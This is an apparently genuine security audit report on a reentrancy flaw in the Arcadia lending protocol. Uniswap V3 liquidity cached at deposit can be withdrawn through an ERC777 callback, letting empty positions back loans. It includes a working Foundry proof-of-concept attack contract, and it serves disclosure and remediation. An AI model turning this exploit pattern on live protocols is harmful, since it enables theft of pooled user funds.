Radiant Parchment Troll

high

# Caching Uniswap position liquidity allows borrowing using undercollateralized Uni positions

## Summary

It is possible to fake the amount of liquidity held in a Uniswap V3 position, making the protocol believe the Uniswap position has more liquidity than the actual liquidity deposited in the position. This makes it possible to borrow using undercollateralized Uniswap positions.

## Vulnerability Detail

When depositing into an account, the `deposit()` function is called, which calls the internal `_deposit()` function. Depositing is performed in two steps:

1. The registry’s `batchProcessDeposit()` function is called. This function checks if the deposited assets can be priced, and in case that a creditor is set, it also updates the exposures and underlying assets for the creditor.
2. The assets are transferred and deposited into the account. 

```solidity
// AccountV1.sol

function _deposit(
        address[] memory assetAddresses,
        uint256[] memory assetIds,
        uint256[] memory assetAmounts,
        address from
    ) internal {
        // If no Creditor is set, batchProcessDeposit only checks if the assets can be priced.
        // If a Creditor is set, batchProcessDeposit will also update the exposures of assets and underlying assets for the Creditor.
        uint256[] memory assetTypes =
            IRegistry(registry).batchProcessDeposit(creditor, assetAddresses, assetIds, assetAmounts);

        for (uint256 i; i < assetAddresses.length; ++i) {
            // Skip if amount is 0 to prevent storing addresses that have 0 balance.
            if (assetAmounts[i] == 0) continue;

            if (assetTypes[i] == 0) {
                if (assetIds[i] != 0) revert AccountErrors.InvalidERC20Id();
                _depositERC20(from, assetAddresses[i], assetAmounts[i]);
            } else if (assetTypes[i] == 1) {
                if (assetAmounts[i] != 1) revert AccountErrors.InvalidERC721Amount();
                _depositERC721(from, assetAddresses[i], assetIds[i]);
            } else if (assetTypes[i] == 2) {
                _depositERC1155(from, assetAddresses[i], assetIds[i], assetAmounts[i]);
            } else {
                revert AccountErrors.UnknownAssetType();
            }
        }

        if (erc20Stored.length + erc721Stored.length + erc1155Stored.length > ASSET_LIMIT) {
            revert AccountErrors.TooManyAssets();
        }
    }

```

For Uniswap positions (and assuming that a creditor is set), calling `batchProcessDeposit()` will internally trigger the `UniswapV3AM.processDirectDeposit()`:

```solidity
// UniswapV3AM.sol

function processDirectDeposit(address creditor, address asset, uint256 assetId, uint256 amount)
        public
        override
        returns (uint256 recursiveCalls, uint256 assetType)
    {
        // Amount deposited of a Uniswap V3 LP can be either 0 or 1 (checked in the Account).
        // For uniswap V3 every id is a unique asset -> on every deposit the asset must added to the Asset Module.
        if (amount == 1) _addAsset(assetId);

        ...
    }

```

The Uniswap position will then be added to the protocol using the internal `_addAsset()` function. One of the most important actions performed inside this function is to store the liquidity that the Uniswap position has in that moment. Such liquidity is obtained from directly querying the NonfungiblePositionManager contract:

```solidity
function _addAsset(uint256 assetId) internal {
        ...

        (,, address token0, address token1,,,, uint128 liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);

        // No need to explicitly check if token0 and token1 are allowed, _addAsset() is only called in the
        // deposit functions and there any deposit of non-allowed Underlying Assets will revert.
        if (liquidity == 0) revert ZeroLiquidity();

        // The liquidity of the Liquidity Position is stored in the Asset Module,
        // not fetched from the NonfungiblePositionManager.
        // Since liquidity of a position can be increased by a non-owner,
        // the max exposure checks could otherwise be circumvented.
        assetToLiquidity[assetId] = liquidity;

        ...
    }
```

As the snippet shows, the liquidity is stored in a mapping because *“Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.”.*  From this point forward, and until the Uniswap position is withdrawn from the account, the collateral value (i.e the amount that the position is worth) will be computed utilizing the `_getPosition()` internal function, which will read the cached liquidity value stored in the `assetToLiquidity[assetId]` mapping, rather than directly consulting the NonFungibleManager contract. This way, the position won’t be able to surpass the max exposures:

```solidity
// UniswapV3AM.sol

function _getPosition(uint256 assetId)
        internal
        view
        returns (address token0, address token1, int24 tickLower, int24 tickUpper, uint128 liquidity)
    {
        // For deposited assets, the liquidity of the Liquidity Position is stored in the Asset Module,
        // not fetched from the NonfungiblePositionManager.
        // Since liquidity of a position can be increased by a non-owner, the max exposure checks could otherwise be circumvented.
        liquidity = uint128(assetToLiquidity[assetId]);

        if (liquidity > 0) {
            (,, token0, token1,, tickLower, tickUpper,,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);
        } else {
            // Only used as an off-chain view function by getValue() to return the value of a non deposited Liquidity Position.
            (,, token0, token1,, tickLower, tickUpper, liquidity,,,,) = NON_FUNGIBLE_POSITION_MANAGER.positions(assetId);
        }
    }
```

However, storing the liquidity leads to an attack vector that allows Uniswap positions’ liquidity to be comlpetely withdrawn while making the protocol believe that the Uniswap position is still full.

As mentioned in the beginning of the report, the deposit process is done in two steps: processing assets in the registry and transferring the actual assets to the account. Because processing assets in the registry is the step where the Uniswap position’s liquidity is cached, a malicious depositor can use an ERC777 hook in the transferring process to withdraw the liquidity in the Uniswap position.

The following steps show how the attack could be performed:

1. Initially, a malicious contract must be created. This contract will be the one holding the assets and depositing them into the account, and will also be able to trigger the ERC777’s `tokensToSend()` hook.
2. The malicious contract will call the account’s `deposit()` function with two `assetAddresses` to be deposited: the first asset must be an ERC777 token, and the second asset must be the Uniswap position. 
3. `IRegistry(registry).batchProcessDeposit()` will then execute. This is the first of the two steps taking place to deposit assets, where the liquidity from the Uniswap position will be fetched from the NonFungiblePositionManager and stored in the `assetToLiquidity[assetId]` mapping. 
4. After processing the assets, the transferring phase will start. The first asset to be transferred will be the ERC777 token. This will trigger the `tokensToSend()` hook in our malicious contract. At this point, our contract is still the owner of the Uniswap position (the Uniswap position won’t be transferred until the ERC777 transfer finishes), so the liquidity in the Uniswap position can be decreased inside the hook triggered in the malicious contract. This leaves the Uniswap position with a smaller liquidity amount than the one stored in the `batchProcessDeposit()` step, making the protocol believe that the liquidity stored in the position is the one that the position had prior to starting the attack. 
5. Finally, and following the transfer of the ERC777 token, the Uniswap position will be transferred and succesfully deposited in the account. Arcadia will believe that the account has a Uniswap position worth some liquidity, when in reality the Uni position will be empty.

## Proof of Concept

This proof of concept show show the previous attack can be performed so that the liquidity in the uniswap position is 0, while the collateral value for the account is far greater than 0.

1. Create a `ERC777Mock.sol` file in `lib/accounts-v2/test/utils/mocks/tokens` and paste the code found in [this github gist](https://gist.github.com/0xadrii/3677f0b5dfb9dcfe6b8b3953115d03f5).
2. Import the ERC777Mock and change the MockOracles, MockERC20 and Rates structs in `lib/accounts-v2/test/utils/Types.sol` to add an additional `token777ToUsd`, `token777` of type ERC777Mock and token777ToUsd rate:
    
    ```solidity
    import "../utils/mocks/tokens/ERC777Mock.sol"; // <----- Import this
    
    ...
    
    struct MockOracles {
        ArcadiaOracle stable1ToUsd;
        ArcadiaOracle stable2ToUsd;
        ArcadiaOracle token1ToUsd;
        ArcadiaOracle token2ToUsd;
        ArcadiaOracle token3ToToken4;
        ArcadiaOracle token4ToUsd;
        ArcadiaOracle token777ToUsd; // <----- Add this
        ArcadiaOracle nft1ToToken1;
        ArcadiaOracle nft2ToUsd;
        ArcadiaOracle nft3ToToken1;
        ArcadiaOracle sft1ToToken1;
        ArcadiaOracle sft2ToUsd;
    }
    
    struct MockERC20 {
        ERC20Mock stable1;
        ERC20Mock stable2;
        ERC20Mock token1;
        ERC20Mock token2;
        ERC20Mock token3;
        ERC20Mock token4;
        ERC777Mock token777; // <----- Add this
    }
    
    ...
    
    struct Rates {
        uint256 stable1ToUsd;
        uint256 stable2ToUsd;
        uint256 token1ToUsd;
        uint256 token2ToUsd;
        uint256 token3ToToken4;
        uint256 token4ToUsd;
        uint256 token777ToUsd; // <----- Add this
        uint256 nft1ToToken1;
        uint256 nft2ToUsd;
        uint256 nft3ToToken1;
        uint256 sft1ToToken1;
        uint256 sft2ToUsd;
    }
    ```
    
3. Replace the contents inside `lib/accounts-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/2eab11990f47385b584d6405cafa1d08).
4. Next step is to replace the file found in `lending-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/eeac07109792c24268a00ac8e4b3339d).
5. Create a  `PocUniswap.t.sol` file in `lending-v2/test/fuzz/LendingPool/PocUniswap.t.sol` and paste the following code snippet into it:
    
    ```solidity
    /**
     * Created by Pragma Labs
     * SPDX-License-Identifier: BUSL-1.1
     */
    pragma solidity 0.8.22;
    
    import { LendingPool_Fuzz_Test } from "./_LendingPool.fuzz.t.sol";
    
    import { IPermit2 } from "../../../lib/accounts-v2/src/interfaces/IPermit2.sol";
    import { UniswapV3AM_Fuzz_Test, UniswapV3Fixture, UniswapV3AM, IUniswapV3PoolExtension, TickMath } from "../../../lib/accounts-v2/test/fuzz/asset-modules/UniswapV3AM/_UniswapV3AM.fuzz.t.sol";
    import { ERC20Mock } from "../../../lib/accounts-v2/test/utils/mocks/tokens/ERC20Mock.sol";
    
    import "forge-std/console.sol";
    
    interface IERC721 {
        function ownerOf(uint256 tokenid) external returns(address);
        function approve(address spender, uint256 tokenId) external;
    }
     
    /// @notice Proof of Concept - Arcadia
    contract Poc is LendingPool_Fuzz_Test, UniswapV3AM_Fuzz_Test { 
    
        /////////////////////////////////////////////////////////////////
        //                         CONSTANTS                           //
        /////////////////////////////////////////////////////////////////
        int24 private MIN_TICK = -887_272;
        int24 private MAX_TICK = -MIN_TICK;
    
        /////////////////////////////////////////////////////////////////
        //                          STORAGE                            //
        /////////////////////////////////////////////////////////////////
        AccountOwner public accountOwnerContract;
        ERC20Mock token0;
        ERC20Mock token1;
        uint256 tokenId;
    
        /////////////////////////////////////////////////////////////////
        //                          SETUP                              //
        /////////////////////////////////////////////////////////////////
    
        function setUp() public override(LendingPool_Fuzz_Test, UniswapV3AM_Fuzz_Test) {
            // Setup pool test
            LendingPool_Fuzz_Test.setUp();
    
            // Deploy fixture for Uniswap.
            UniswapV3Fixture.setUp();
    
            deployUniswapV3AM(address(nonfungiblePositionManager));
    
            vm.startPrank(users.riskManager);
            registryExtension.setRiskParametersOfDerivedAM(
                address(pool), address(uniV3AssetModule), type(uint112).max, 100
            );
     
            token0 = mockERC20.token1;
            token1 = mockERC20.token2;
            (token0, token1) = token0 < token1 ? (token0, token1) : (token1, token0);
    
            // Deploy account owner
            accountOwnerContract = new AccountOwner(address(nonfungiblePositionManager));
    
            
            // Set origination fee
            vm.startPrank(users.creatorAddress);
            pool.setOriginationFee(100); // 1%
    
            // Transfer ownership to Account Owner 
            vm.startPrank(users.accountOwner);
            factory.safeTransferFrom(users.accountOwner, address(accountOwnerContract), address(proxyAccount));
            vm.stopPrank();
            
    
            // Mint uniswap position underlying tokens to accountOwnerContract
            mockERC20.token1.mint(address(accountOwnerContract), 100 ether);
            mockERC20.token2.mint(address(accountOwnerContract), 100 ether);
    
            // Open Uniswap position 
            tokenId = _openUniswapPosition();
     
    
            // Transfer some ERC777 tokens to accountOwnerContract. These will be used to be deposited as collateral into the account
             vm.startPrank(users.liquidityProvider);
             mockERC20.token777.transfer(address(accountOwnerContract), 1 ether);
        }
    
        /////////////////////////////////////////////////////////////////
        //                           POC                               //
        /////////////////////////////////////////////////////////////////
        /// @notice Test exploiting the reentrancy vulnerability. 
        function testVuln_borrowUsingUndercollateralizedUniswapPosition(
            uint128 amountLoaned,
            uint112 collateralValue,
            uint128 liquidity,
            uint8 originationFee
        ) public {   
    
            //----------            STEP 1            ----------//
            // Open margin account setting pool as new creditor
            vm.startPrank(address(accountOwnerContract));
            proxyAccount.openMarginAccount(address(pool)); 
            
            //----------            STEP 2            ----------//
            // Deposit assets into account. The order of the assets to be deposited is important. The first asset will be an ERC777 token that triggers the callback on transferring.
            // The second asset will be the uniswap position.
    
            address[] memory assetAddresses = new address[](2);
            assetAddresses[0] = address(mockERC20.token777);
            assetAddresses[1] = address(nonfungiblePositionManager);
            uint256[] memory assetIds = new uint256[](2);
            assetIds[0] = 0;
            assetIds[1] = tokenId;
            uint256[] memory assetAmounts = new uint256[](2);
            assetAmounts[0] = 1; // no need to send more than 1 wei as the ERC777 only serves to trigger the callback
            assetAmounts[1] = 1;
            // Set approvals
            IERC721(address(nonfungiblePositionManager)).approve(address(proxyAccount), tokenId);
            mockERC20.token777.approve(address(proxyAccount), type(uint256).max);
    
            // Perform deposit. 
            // Deposit will perform two steps:
            // 1. processDeposit(): this step will handle the deposited assets and verify everything is correct. For uniswap positions, the liquidity in the position
            // will be stored in the `assetToLiquidity` mapping.
            // 2.Transferring the assets: after processing the assets, the actual asset transfers will take place. First, the ER777 colallateral will be transferred. 
            // This will trigger the callback in the accountOwnerContract (the account owner), which will withdraw all the uniswap position liquidity. Because the uniswap 
            // position liquidity has been cached in step 1 (processDeposit()), the protocol will still believe that the uniswap position has some liquidity, when in reality
            // all the liquidity from the position has been withdrawn in the ERC777 `tokensToSend()` callback. 
            proxyAccount.deposit(assetAddresses, assetIds, assetAmounts);
    
            //----------       FINAL ASSERTIONS       ----------//
            // Collateral value fetches the `assetToLiquidity` value cached prior to removing position liquidity. This does not reflect that the position is empty,
            // hence it is possible to borrow with an empty uniswap position.
            uint256 finalCollateralValue = proxyAccount.getCollateralValue();
    
            // Liquidity in the position is 0.
            (
                ,
                ,
                ,
                ,
                ,
                ,
                ,
                uint128 liquidity,
                ,
                ,
                ,
            ) = nonfungiblePositionManager.positions(tokenId); 
    
            console.log("Collateral value of account:", finalCollateralValue);
            console.log("Actual liquidity in position", liquidity);
    
            assertEq(liquidity, 0);
            assertGt(finalCollateralValue, 1000 ether); // Collateral value is greater than 1000
        } 
    
        function _openUniswapPosition() internal returns(uint256 tokenId) {
            vm.startPrank(address(accountOwnerContract));
           
            uint160 sqrtPriceX96 = uint160(
                calculateAndValidateRangeTickCurrent(
                    10 * 10**18, // priceToken0
                    20 * 10**18 // priceToken1
                )
            );
    
            // Create Uniswap V3 pool initiated at tickCurrent with cardinality 300.
            IUniswapV3PoolExtension uniswapPool = createPool(token0, token1, TickMath.getSqrtRatioAtTick(TickMath.getTickAtSqrtRatio(sqrtPriceX96)), 300);
    
            // Approve liquidity
            mockERC20.token1.approve(address(uniswapPool), type(uint256).max);
            mockERC20.token2.approve(address(uniswapPool), type(uint256).max);
    
            // Mint liquidity position.
            uint128 liquidity = 100 * 10**18;
            tokenId = addLiquidity(uniswapPool, liquidity, address(accountOwnerContract), MIN_TICK, MAX_TICK, false);
     
            assertEq(IERC721(address(nonfungiblePositionManager)).ownerOf(tokenId), address(accountOwnerContract));
        }
     
    }
    
    /// @notice ERC777Sender interface
    interface IERC777Sender {
        /**
         * @dev Called by an {IERC777} token contract whenever a registered holder's
         * (`from`) tokens are about to be moved or destroyed. The type of operation
         * is conveyed by `to` being the zero address or not.
         *
         * This call occurs _before_ the token contract's state is updated, so
         * {IERC777-balanceOf}, etc., can be used to query the pre-operation state.
         *
         * This function may revert to prevent the operation from being executed.
         */
        function tokensToSend(
            address operator,
            address from,
            address to,
            uint256 amount,
            bytes calldata userData,
            bytes calldata operatorData
        ) external;
    }
    
    interface INonfungiblePositionManager {
         function positions(uint256 tokenId)
            external
            view
            returns (
                uint96 nonce,
                address operator,
                address token0,
                address token1,
                uint24 fee,
                int24 tickLower,
                int24 tickUpper,
                uint128 liquidity,
                uint256 feeGrowthInside0LastX128,
                uint256 feeGrowthInside1LastX128,
                uint128 tokensOwed0,
                uint128 tokensOwed1
            );
    
        struct DecreaseLiquidityParams {
            uint256 tokenId;
            uint128 liquidity;
            uint256 amount0Min;
            uint256 amount1Min;
            uint256 deadline;
        }
        function decreaseLiquidity(DecreaseLiquidityParams calldata params)
            external
            payable
            returns (uint256 amount0, uint256 amount1);
    }
    
     /// @notice AccountOwner contract that will trigger the attack via ERC777's `tokensToSend()` callback
    contract AccountOwner is IERC777Sender  {
    
            INonfungiblePositionManager public nonfungiblePositionManager;
    
            constructor(address _nonfungiblePositionManager) {
                nonfungiblePositionManager = INonfungiblePositionManager(_nonfungiblePositionManager);
            }
    
         function tokensToSend(
            address operator,
            address from,
            address to,
            uint256 amount,
            bytes calldata userData,
            bytes calldata operatorData
        ) external {
            // Remove liquidity from Uniswap position
           (
                ,
                ,
                ,
                ,
                ,
                ,
                 ,
                uint128 liquidity,
                ,
                ,
                ,
            ) = nonfungiblePositionManager.positions(1); // tokenId 1
    
            INonfungiblePositionManager.DecreaseLiquidityParams memory params = INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: 1,
                liquidity: liquidity,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            });
            nonfungiblePositionManager.decreaseLiquidity(params);
        }
      
    
        function onERC721Received(address, address, uint256, bytes calldata) public pure returns (bytes4) {
            return bytes4(abi.encodeWithSignature("onERC721Received(address,address,uint256,bytes)"));
        }
    
    }
    ```
    
6. Execute the following command being inside the `lending-v2` folder: `forge test --mt testVuln_borrowUsingUndercollateralizedUniswapPosition -vvvvv`. 

NOTE: It is possible that you find issues related to code not being found. This is because the Uniswap V3 deployment uses foundry’s `vm.getCode()` and we are importing the deployment file from the `accounts-v2` repo to the `lending-v2` repo, which makes foundry throw some errors. To fix this, just compile the contracts in the `accounts-v2` repo and copy the missing folders from the `accounts-v2/out` generated folder into the `lending-v2/out` folder.

## Impact

High. The protocol will always believe that there is liquidity deposited in the Uniswap position while in reality the position is empty. This allows for undercollateralized borrows, essentially enabling the protocol to be drained if the attack is performed utilizing several uniswap positions.

## Code Snippet

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/asset-modules/UniswapV3/UniswapV3AM.sol#L107

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L844

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/accounts-v2/src/accounts/AccountV1.sol#L855

## Tool used

Manual Review

## Recommendation

There are several ways to mitigate this issue. One possible option is to perform the transfer of assets when depositing at the same time that the asset is processed, instead of first processing the assets (and storing the Uniswap liquidity) and then transferring them. Another option is to perform a liquidity check after depositing the Uniswap position, ensuring that the liquidity stored in the assetToLiquidity[assetId] mapping and the one returned by the NonFungiblePositionManager are the same.
